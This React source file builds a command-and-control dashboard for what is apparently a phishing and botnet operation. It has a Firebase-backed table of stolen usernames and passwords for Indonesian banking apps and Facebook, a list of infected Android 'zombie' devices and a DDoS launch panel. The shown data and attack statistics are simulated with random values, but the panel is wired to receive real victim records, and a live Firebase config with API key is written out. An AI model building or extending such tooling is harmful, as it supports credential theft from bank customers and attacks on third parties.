import React, { useState, useEffect } from 'react';
import { initializeApp } from 'firebase/app';
import { getAuth, signInAnonymously, onAuthStateChanged } from 'firebase/auth';
import { getFirestore, collection, query, onSnapshot, addDoc, serverTimestamp } from 'firebase/firestore';
import { Skull, Zap, Terminal, Activity, Download, Smartphone, Radio } from 'lucide-react';

// --- CONFIG FIREBASE KAMU ---
const firebaseConfig = {
  apiKey: "AIzaSyAMmcOF9E5LA8Cu3dxvstyPCzjd_ZZ_NIM",
  authDomain: "tahu-bulat-dad9d.firebaseapp.com",
  projectId: "tahu-bulat-dad9d",
  storageBucket: "tahu-bulat-dad9d.firebasestorage.app",
  messagingSenderId: "784968244179",
  appId: "1:784968244179:web:fbf29b0745bfdc5fb52d26",
  measurementId: "G-JK1NHZDRN8"
};

// Inisialisasi Firebase menggunakan config pribadimu
const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

// Gunakan App ID unik agar tidak bentrok dengan user lain di project yang sama
const appId = "tahu-bulat-c2-pro"; 

export default function App() {
  const [user, setUser] = useState(null);
  const [logs, setLogs] = useState([]);
  const [victims, setVictims] = useState([]);
  const [bots, setBots] = useState([]);
  const [isAttacking, setIsAttacking] = useState(false);
  const [ddosTarget, setDdosTarget] = useState('1.1.1.1');
  const [activeModal, setActiveModal] = useState(null);
  const [stats, setStats] = useState({ reqs: 0, bw: 0 });

  // 1. Auth Lifecycle
  useEffect(() => {
    const initAuth = async () => {
      try {
        // Login anonim agar bisa akses Firestore
        await signInAnonymously(auth);
      } catch (err) {
        console.error("Auth Error:", err);
      }
    };
    initAuth();
    const unsubscribe = onAuthStateChanged(auth, (currentUser) => {
      if (currentUser) setUser(currentUser);
    });
    return () => unsubscribe();
  }, []);

  // 2. Real-Time Listeners (Hanya jalan jika sudah login)
  useEffect(() => {
    if (!user) return;

    // Path sesuai mandat: /artifacts/{appId}/public/data/{collection}
    const vRef = collection(db, 'artifacts', appId, 'public', 'data', 'victims');
    const unsubVictims = onSnapshot(vRef, (snapshot) => {
      const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
      setVictims(data.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)));
    }, (err) => console.error("Victims Error:", err));

    const bRef = collection(db, 'artifacts', appId, 'public', 'data', 'bots');
    const unsubBots = onSnapshot(bRef, (snapshot) => {
      const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
      setBots(data);
    }, (err) => console.error("Bots Error:", err));

    const lRef = collection(db, 'artifacts', appId, 'public', 'data', 'logs');
    const unsubLogs = onSnapshot(lRef, (snapshot) => {
      const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
      setLogs(data.sort((a, b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0)).slice(0, 50));
    }, (err) => console.error("Logs Error:", err));

    return () => {
      unsubVictims();
      unsubBots();
      unsubLogs();
    };
  }, [user]);

  // Actions
  const addLog = async (message, type = 'INFO') => {
    if (!user) return;
    await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'logs'), {
      message,
      type,
      timestamp: serverTimestamp()
    });
  };

  const simulateInbound = async () => {
    if (!user) return;
    const platforms = ['DANA', 'BRIMO', 'BCA', 'FACEBOOK'];
    await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'victims'), {
      platform: platforms[Math.floor(Math.random() * platforms.length)],
      username: `user_${Math.random().toString(36).substring(7)}@gmail.com`,
      password: `Pass${Math.floor(Math.random() * 9999)}`,
      ip: `${Math.floor(Math.random()*255)}.x.x.x`,
      timestamp: Date.now()
    });
    addLog("Data Kredensial Baru Diterima", "SUCCESS");
  };

  const simulateBot = async () => {
    if (!user) return;
    await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'bots'), {
      deviceId: `VIC-${Math.floor(1000 + Math.random() * 9000)}`,
      os: 'Android 14',
      status: 'online',
      timestamp: Date.now()
    });
    addLog("Botnet Socket Terhubung", "RAT");
  };

  useEffect(() => {
    let interval;
    if (isAttacking) {
      interval = setInterval(() => {
        setStats({ reqs: Math.floor(Math.random() * 100000) + 50000, bw: (Math.random() * 800).toFixed(2) });
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [isAttacking]);

  return (
    <div className="min-h-screen bg-[#050505] text-[#00ff00] font-mono p-8 overflow-x-hidden">
      <div className="fixed inset-0 pointer-events-none opacity-10 bg-[radial-gradient(#00ff00_1px,transparent_1px)] [background-size:20px_20px]"></div>
      
      <header className="flex justify-between items-center mb-8 border-b border-green-900 pb-6 relative z-10">
        <div>
          <h1 className="text-3xl font-black text-white flex items-center gap-3">
            <Skull className="text-red-600 w-8 h-8" /> 
            C2 PANEL <span className="text-red-600 text-xl font-light">TAHU BULAT</span>
          </h1>
          <p className="text-[10px] text-green-700 font-bold tracking-[0.4em]">CONNECTED TO: {firebaseConfig.projectId}</p>
        </div>
        
        <div className="text-right">
          <div className="flex items-center gap-2 text-green-400">
            <span className={`w-2 h-2 rounded-full ${user ? 'bg-green-500 animate-pulse' : 'bg-red-500'}`}></span>
            <span className="text-xs font-bold">{user ? 'LIVE SESSION' : 'CONNECTING...'}</span>
          </div>
          <p className="text-[10px] text-gray-500">ID: {user?.uid?.substring(0,8)}</p>
        </div>
      </header>

      <main className="grid grid-cols-1 lg:grid-cols-3 gap-6 relative z-10">
        <div className="lg:col-span-2 space-y-6">
          {/* Victims Table */}
          <div className="bg-black/80 border border-green-900 rounded-lg overflow-hidden">
            <div className="bg-green-950/20 px-4 py-3 border-b border-green-900 flex justify-between">
              <h2 className="text-xs font-black uppercase flex items-center gap-2"><Terminal size={14} /> EXFIL DATA</h2>
              <button onClick={simulateInbound} className="text-[9px] bg-green-900/40 px-3 py-1 rounded">SEND TEST DATA</button>
            </div>
            <table className="w-full text-left text-[11px]">
              <thead className="bg-black text-green-600 uppercase border-b border-green-900">
                <tr><th className="p-4">Platform</th><th className="p-4">User</th><th className="p-4">Pass</th><th className="p-4">IP</th></tr>
              </thead>
              <tbody className="divide-y divide-green-950/30">
                {victims.map(v => (
                  <tr key={v.id} className="hover:bg-green-500/5">
                    <td className="p-4 font-black text-red-500">{v.platform}</td>
                    <td className="p-4 text-gray-300">{v.username}</td>
                    <td className="p-4 font-mono text-white/80">{v.password}</td>
                    <td className="p-4 text-blue-500">{v.ip}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>

          {/* DDoS Section */}
          <div className={`bg-black/80 border ${isAttacking ? 'border-red-600' : 'border-orange-900'} rounded-lg p-5`}>
            <h2 className="text-xs font-black text-orange-500 mb-4 uppercase flex items-center gap-2"><Zap size={14} /> ATTACK VECTOR</h2>
            <div className="flex gap-4">
              <input type="text" value={ddosTarget} onChange={e=>setDdosTarget(e.target.value)} className="flex-1 bg-black border border-orange-900 p-2 text-xs" />
              <button onClick={() => setIsAttacking(!isAttacking)} className={`px-6 py-2 text-xs font-black ${isAttacking ? 'bg-red-600' : 'bg-orange-600'}`}>
                {isAttacking ? 'STOP' : 'FIRE'}
              </button>
            </div>
          </div>
        </div>

        <div className="space-y-6">
          {/* Bots */}
          <div className="bg-black/80 border border-blue-900 rounded-lg p-5">
            <div className="flex justify-between items-center mb-4">
              <h2 className="text-xs font-black text-blue-500 uppercase flex items-center gap-2"><Radio size={14} /> ZOMBIES</h2>
              <button onClick={simulateBot} className="text-[8px] border border-blue-900 px-2 py-1">ADD</button>
            </div>
            {bots.map(bot => (
              <div key={bot.id} className="text-[10px] mb-2 p-2 bg-blue-950/10 border border-blue-900/30 rounded flex justify-between items-center">
                <span>{bot.deviceId}</span>
                <span className="text-blue-500 uppercase text-[8px]">Online</span>
              </div>
            ))}
          </div>

          {/* Logs */}
          <div className="bg-black/80 border border-green-900 rounded-lg p-5 h-64 overflow-y-auto custom-scrollbar">
            <h2 className="text-xs font-black mb-3 uppercase">Activity Logs</h2>
            {logs.map(log => (
              <div key={log.id} className="text-[9px] mb-1 border-b border-green-900/10">
                <span className="text-gray-600">[{log.timestamp?.seconds ? new Date(log.timestamp.seconds * 1000).toLocaleTimeString() : '...'}]</span>
                <span className="ml-2">{log.message}</span>
              </div>
            ))}
          </div>
        </div>
      </main>
    </div>
  );
}
